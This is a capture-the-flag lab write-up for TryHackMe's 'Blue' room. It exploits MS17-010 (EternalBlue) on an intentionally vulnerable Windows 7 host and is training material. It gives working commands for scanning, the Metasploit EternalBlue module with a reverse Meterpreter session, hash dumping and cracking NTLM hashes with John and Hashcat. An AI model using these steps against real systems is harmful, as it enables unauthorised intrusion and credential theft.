---
title: THM — Blue
type: lab-writeup
platform: THM
difficulty: foundational
os: Windows
status: Complete
date: 2026-03-24
tags:
  - foundational
  - lab
  - THM
  - windows
  - eternalblue
  - ms17-010
  - metasploit
  - smb
---

# THM — Blue

## Lab Info

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Room | Blue |
| Difficulty | Easy |
| OS | Windows 7 SP1 x64 |
| IP | Machine IP (assigned at room launch) |
| Date | 2026-03-24 |

> **Note:** This room is based on MS17-010 (EternalBlue) — the same exploit used by the WannaCry ransomware campaign in May 2017. Intentionally vulnerable machine for educational purposes only.

---

## Objectives

- [x] Recon: identify open ports and services
- [x] Exploit: gain initial access using EternalBlue
- [x] Escalate: confirm SYSTEM-level access
- [x] Post-exploitation: crack dumped password hashes
- [x] Capture user and root flags

---

## Enumeration

### Port scan

```bash
nmap -sC -sV -O --script vuln -oN nmap/blue_initial <MACHINE_IP>
```

**Flags explained:**
- `-sC` — default scripts
- `-sV` — service/version detection
- `-O` — OS detection
- `--script vuln` — run vulnerability detection scripts
- `-oN` — save output in normal format

**Open ports (expected results):**

| Port | Service | Notes |
|---|---|---|
| 135/tcp | msrpc | Microsoft RPC |
| 139/tcp | netbios-ssn | SMB over NetBIOS |
| 445/tcp | microsoft-ds | SMB — primary attack surface |
| 3389/tcp | ms-wbt-server | RDP |
| 49152–49158 | msrpc | Dynamic RPC ports |

**Key nmap vuln script output:**

```
smb-vuln-ms17-010: VULNERABLE
Remote Code Execution in Microsoft SMBv1 (MS17-010)
CVE: CVE-2017-0144
```

---

## Vulnerability Background

**MS17-010 (EternalBlue)** — Critical RCE in Microsoft SMBv1.

| Field | Detail |
|---|---|
| CVE | CVE-2017-0144 |
| CVSS | 9.3 Critical |
| Affected | Windows Vista, 7, 8.1, 10, Server 2003–2016 (unpatched) |
| Patch | Microsoft Security Bulletin MS17-010 (March 2017) |
| Exploited by | WannaCry (May 2017), NotPetya (June 2017) |

**Root cause:** Buffer overflow in SMBv1 transaction processing allows unauthenticated remote code execution. The exploit triggers a heap spray in the Windows kernel, leading to arbitrary code execution in kernel context.

---

## Foothold

### Exploitation with Metasploit

```bash
msfconsole

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS <MACHINE_IP>
msf6 exploit(...) > set LHOST <YOUR_TUN0_IP>
msf6 exploit(...) > run
```

> **LHOST:** Always use your VPN tunnel IP (`tun0`). Find it with `ip addr show tun0`.

**Expected result:**

```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Privilege Escalation

Not required. EternalBlue directly yields `NT AUTHORITY\SYSTEM`.

---

## Post-Exploitation

### Shell stabilisation

```
meterpreter > shell
```

If unstable, use `post/multi/manage/shell_to_meterpreter`.

### Hash dumping

```
meterpreter > hashdump
```

Output format: `username:RID:LM_hash:NTLM_hash:::`

### Cracking with John the Ripper

```bash
echo "Jon:<RID>:<LM>:<NTLM>:::" > jon_hash.txt
john jon_hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

### Cracking with Hashcat

```bash
hashcat -m 1000 <NTLM_hash> /usr/share/wordlists/rockyou.txt
```

---

## Flags

| Flag | Location |
|---|---|
| Flag 1 | `C:\` |
| Flag 2 | `C:\Windows\System32\config` |
| Flag 3 | `C:\Users\Jon\Documents` |

> Flag values omitted — record yours privately.

---

## Key Takeaways

- EternalBlue remains one of the most impactful exploits in history — unpatched systems are still found in enterprise environments
- SMBv1 must be disabled on all modern systems — no legitimate use case justifies the risk
- NTLM hash dumping enables lateral movement — `hashdump` is a standard post-exploitation step
- Patch management is non-negotiable — MS17-010 was patched in March 2017; WannaCry hit May 2017

---

## Tools Used

- Nmap
- Metasploit
- John-the-Ripper
- Hashcat

---

## References

- [Microsoft MS17-010 Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [NVD CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [TryHackMe Blue Room](https://tryhackme.com/room/blue)

---
*Write-up completed: 2026-03-24*

## See Also

- Penetration-Testing-Methodology
- Metasploit
- Nmap
- John-the-Ripper
- Hashcat
- Windows-Privilege-Escalation
- Common-Ports

---
<- [[Labs-MOC]]